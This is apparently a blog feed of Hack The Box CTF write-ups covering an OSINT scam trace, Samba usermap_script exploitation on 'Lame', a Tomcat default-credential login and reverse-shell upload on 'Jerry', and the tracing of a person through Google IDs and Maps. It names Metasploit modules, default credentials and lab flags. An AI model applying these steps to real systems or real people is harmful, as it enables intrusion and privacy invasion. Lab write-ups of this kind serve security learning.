        <content type="html"><![CDATA[<p><img src="/images/money1.png" alt="challenge"></p><p>You heard it . Frank Vitalik is a huxlr. Have to figure out where the money flows .</p><p>Since we have the dudes name we will try googling it . </p><p>this challenge flew too close to the sun . the fake id’s twitter account was suspended . so we found a reddit page for this guy .</p><a id="more"></a><p><img src="/images/money2.png" alt="frankVitalik"></p><p>going lower into this dude’s post we see a scam post . which has a link to get 10x free coins .</p><p><img src="/images/money3.png" alt="freecoin"></p><p>visiting the link , the full face of the scam is exposed </p><p><img src="/images/money4.png" alt="scam"></p><p>this is apparently on ropsten network . so we can go to the network explorer and see what happens when coins are sent to this address .<br>so if we see first transaction on this account and check its data sent to the smart contract then we will get the flag .</p><p>pretty simple . instead of looking everything from start methodically i had jumped to an assumption which led me straight to rabbit holes<br>dont assume be methodical even mechanical in checking everything . literally EVERYTHING .</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> OSINT </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lame HTB</title>
      <link href="2020/12/12/Lame%20HTB/"/>
      <url>2020/12/12/Lame%20HTB/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/lame1.png" alt="Lame"></p><h2 id="Reconnaisance"><a href="#Reconnaisance" class="headerlink" title="Reconnaisance"></a>Reconnaisance</h2><p>nmap result -</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: 21&#x2F;tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">[*] Nmap: 22&#x2F;tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">[*] Nmap: 139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">[*] Nmap: 445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">[*] Nmap: 3632&#x2F;tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br><span class="line">[*] Nmap: Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><ul><li><p>vsftpd 2.3.4 - tried running the msf exploit for <a href="http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">vsftp2.3.4 backdoor vulnerability</a> but didnt get a shell .<br><img src="/images/lame2.png" alt="vsftpd2.3.4 backdoor vuln"></p></li><li><p>OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) - nothing interesting on searchsploit for this version . </p></li><li><p>Samba smbd 3.X - 4.X (workgroup: WORKGROUP - need to get exact samba version . nmap wont give exact samba version so have to find a tool that will . </p></li></ul><p>found the exact samba version by using metasploit module </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure><p><img src="/images/lame3.png" alt="get samba version"></p><p>now upon research got <a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/">this module which exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default “username map script” configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;samba&#x2F;usermap_script</span><br></pre></td></tr></table></figure><p>and we get root<br><img src="/images/lame4.png" alt="lame root"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jerry HTB</title>
      <link href="2020/12/12/Jerry%20HTB/"/>
      <url>2020/12/12/Jerry%20HTB/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/jerry1.png" alt="jerry"></p><h3 id="Reconnaisance"><a href="#Reconnaisance" class="headerlink" title="Reconnaisance"></a>Reconnaisance</h3><p>nmap result:- </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Nmap: Not shown: 65534 filtered ports                                                                                                                                                    </span><br><span class="line">[*] Nmap: PORT     STATE SERVICE VERSION                                                                                                                                                     </span><br><span class="line">[*] Nmap: 8080&#x2F;tcp open  http    Apache Tomcat&#x2F;Coyote JSP engine 1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><p>got port 8080 is open and is running an apache tomcat server . </p><p>there is a default apache tomcat landing page on the port . also got the version of the server as Apache Tomcat/7.0.88</p><p><img src="/images/jerry2.png" alt="tomcat"></p><p>ran gobuster on the server becacuse fuzz everything . and find all points in the server . then again </p><p><img src="/images/jerry3.png" alt="gobuster"></p><p>going on /manager prompts for username and password . </p><p><img src="/images/jerry4.png" alt="manager"></p><p>looking for default credentials for the apache tomcat with the tomcat_mgr_login metasploit module .</p><p><img src="/images/jerry5.png" alt="login"></p><p>credentials username :- tomcat , password :- s3cret worked .<br>now have access to the manager panel of tomcat .</p><p><img src="/images/jerry6.png" alt="manager-panel"></p><p>can upload a war directory here . cab try to create a reverse shell exploit with metasploit and upload here </p><p>used the tomcat_mgr_upload module of metasploit to get a reverse shell on my local .</p><p><img src="/images/jerry7.png" alt="reverse shell"></p><p>got the flag 2 for 1 </p><p><img src="/images/jerry8.png" alt="flags"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ID Exposed</title>
      <link href="2020/12/12/ID%20Exposed/"/>
      <url>2020/12/12/ID%20Exposed/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/id1.png" alt="id"></p><p>Have to find last location of the person in question . Have there email address . </p><a id="more"></a><p>sherlock gave some results but they didnt pan out . </p><p><img src="/images/id2.png" alt="sherlock"></p><p>the challenge says id exposed. can try to find out her gmail id and then check her google photos and such .</p><p>found out the google id by adding the email to contact and spoofing from the source code of the application using developer tools . amazing resource about how this works and what all can be tracked with it is <a href="https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43">here</a></p><blockquote><p>Everybody who owns a Google account may not be aware of it, but Google uses a lot of different numbers, ID’s, signatures, account names, randomly chosen gobbledygook and meaningless strings to identify your account. Not everything can be tied together in an easy way, but there are a few handy shortcuts when you are looking at Gmail addresses or a YouTube account for instance. I am not able to do this in bulk yet, but I know there are people out there that might be able to make that happen.</p></blockquote><p><img src="/images/id3.png" alt="googleID"></p><p>have a public api for google which will give us info about the person when called with the google id .</p><p><code>data-personid = c301569479640700229 </code></p><p>now to get the actual google id we have to make a call to people.google.com because its a private data . this is the api call which should work .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;people.googleapis.com&#x2F;v1&#x2F;people&#x2F;c301569479640700229?personFields&#x3D;metadata?key&#x3D;GOOGLE_CLOUD_KEYS</span><br></pre></td></tr></table></figure><p>after getting the google id can take a look at the ‘contributions’ that a GoogleID has made to Google Maps. This means reviews and photos, for the most part. Certainly the kind of data that would tick the boxes of what this CTF solution asks of us.</p><p>So, I tack the GoogleID onto the appropriate URL…</p><p><a href="https://www.google.com/maps/contrib/117395327982835488254/">https://www.google.com/maps/contrib/117395327982835488254/</a><br><img src="/images/id4.png" alt="map"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">really nice museum %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%5%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%HTB&#123;i_W4S_D_I_S_c_O_v_3_R_3_D&#125;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br></pre></td></tr></table></figure><p>which also contains the flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> OSINT </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
